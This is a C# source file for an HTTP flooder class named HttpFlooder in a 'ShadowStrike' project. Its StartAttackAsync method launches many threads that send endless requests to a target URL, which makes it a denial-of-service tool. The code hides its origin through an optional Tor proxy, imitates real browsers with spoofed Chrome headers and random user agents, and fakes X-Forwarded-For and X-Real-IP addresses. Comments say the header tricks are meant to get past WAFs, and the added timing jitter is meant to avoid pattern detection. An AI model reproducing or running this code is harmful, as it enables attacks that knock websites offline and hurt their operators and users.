using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace ShadowStrike.Core
{
    public class HttpFlooder
    {
        private int _requestCount;
        public int RequestCount => _requestCount;

        private int _failedCount;
        public int FailedCount => _failedCount;
        private bool _isRunning;
        private Random _random = new Random();

        public void Stop()
        {
            _isRunning = false;
        }

        public async Task StartAttackAsync(string url, int threads, CancellationToken token, bool useTor = false, int torPort = 9050, System.Net.CookieContainer cookies = null, string userAgent = null)
        {
            _isRunning = true;
            _requestCount = 0;
            _failedCount = 0;

            // Create handler with optional Tor proxy
            var handler = new HttpClientHandler
            {
                MaxConnectionsPerServer = 100,
                UseCookies = cookies != null, // Enable cookies if provided
                CookieContainer = cookies ?? new System.Net.CookieContainer(),
                AutomaticDecompression = System.Net.DecompressionMethods.All, // Enable decompression for better realism
                AllowAutoRedirect = true // Follow redirects (important for bypass)
            };

            // If Tor is enabled, route through Tor SOCKS5 proxy
            if (useTor)
            {
                handler.Proxy = new System.Net.WebProxy($"socks5://127.0.0.1:{torPort}");
                handler.UseProxy = true;
            }

            using var client = new HttpClient(handler);
            client.Timeout = TimeSpan.FromSeconds(20); // Longer timeout for Tor/Bypass

            // Set default headers
            if (!string.IsNullOrEmpty(userAgent))
            {
                client.DefaultRequestHeaders.UserAgent.ParseAdd(userAgent);
            }

            var tasks = new List<Task>();

            for (int i = 0; i < threads; i++)
            {
                tasks.Add(Task.Run(async () =>
                {
                    while (_isRunning && !token.IsCancellationRequested)
                    {
                        try
                        {
                            var request = new HttpRequestMessage(HttpMethod.Get, url);
                            request.Version = new Version(2, 0); // Force HTTP/2 (looks more like modern browser)
                            
                            // If no specific UA provided, randomize it
                            if (string.IsNullOrEmpty(userAgent))
                            {
                                request.Headers.Add("User-Agent", GetRandomUserAgent());
                            }
                            // Otherwise client.DefaultRequestHeaders handles it

                            // Chrome-specific headers (Sec-Ch-Ua) to match the User-Agent
                            // Note: In a real scenario, these should match the specific UA version.
                            // We'll use generic "modern Chrome" values.
                            request.Headers.Add("Sec-Ch-Ua", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"");
                            request.Headers.Add("Sec-Ch-Ua-Mobile", "?0");
                            request.Headers.Add("Sec-Ch-Ua-Platform", "\"Windows\"");
                            request.Headers.Add("Sec-Fetch-Dest", "document");
                            request.Headers.Add("Sec-Fetch-Mode", "navigate");
                            request.Headers.Add("Sec-Fetch-Site", "none");
                            request.Headers.Add("Sec-Fetch-User", "?1");

                            request.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
                            request.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                            request.Headers.Add("Accept-Encoding", "gzip, deflate, br"); // Brotli is important for Chrome
                            // request.Headers.Add("Referer", GetRandomReferer()); // Referer might be suspicious if it's random for a direct visit
                            request.Headers.Add("DNT", "1");
                            request.Headers.Add("Upgrade-Insecure-Requests", "1");
                            
                            // Spoofed IP (some WAFs check this)
                            request.Headers.Add("X-Forwarded-For", GetRandomIp());
                            request.Headers.Add("X-Real-IP", GetRandomIp());

                            using var response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, token);
                            Interlocked.Increment(ref _requestCount);
                            
                            // TIMING JITTER: Random delay between 5-50ms to avoid pattern detection
                            await Task.Delay(_random.Next(5, 50));
                        }
                        catch
                        {
                            Interlocked.Increment(ref _failedCount);
                        }
                    }
                }, token));
            }

            await Task.WhenAll(tasks);
        }

        private string GetRandomUserAgent()
        {
            var agents = new[]
            {
                // Chrome Windows
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                
                // Chrome Mac
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                
                // Chrome Linux
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                
                // Firefox Windows
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
                
                // Firefox Mac
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
                
                // Safari Mac
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
                
                // Edge Windows
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
                
                // Mobile Chrome
                "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
                "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
                
                // Mobile Safari
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
                
                // Opera
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
                
                // Brave
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Brave/120.0.0.0"
            };
            return agents[_random.Next(agents.Length)];
        }

        private string GetRandomAcceptLanguage()
        {
            var languages = new[]
            {
                "en-US,en;q=0.9",
                "en-GB,en;q=0.9",
                "en-US,en;q=0.9,es;q=0.8",
                "en-US,en;q=0.9,fr;q=0.8",
                "de-DE,de;q=0.9,en;q=0.8",
                "fr-FR,fr;q=0.9,en;q=0.8",
                "es-ES,es;q=0.9,en;q=0.8",
                "ja-JP,ja;q=0.9,en;q=0.8",
                "zh-CN,zh;q=0.9,en;q=0.8",
                "pt-BR,pt;q=0.9,en;q=0.8"
            };
            return languages[_random.Next(languages.Length)];
        }

        private string GetRandomAcceptEncoding()
        {
            var encodings = new[]
            {
                "gzip, deflate, br",
                "gzip, deflate",
                "br, gzip, deflate",
                "identity"
            };
            return encodings[_random.Next(encodings.Length)];
        }

        private string GetRandomReferer()
        {
            var referers = new[]
            {
                "https://www.google.com/",
                "https://www.bing.com/",
                "https://www.facebook.com/",
                "https://www.twitter.com/",
                "https://www.reddit.com/",
                "https://www.youtube.com/",
                "https://www.linkedin.com/",
                "https://www.instagram.com/",
                "https://duckduckgo.com/",
                "https://www.yahoo.com/"
            };
            return referers[_random.Next(referers.Length)];
        }

        private string GetRandomIp()
        {
            return $"{_random.Next(1, 255)}.{_random.Next(0, 255)}.{_random.Next(0, 255)}.{_random.Next(1, 255)}";
        }
    }
}
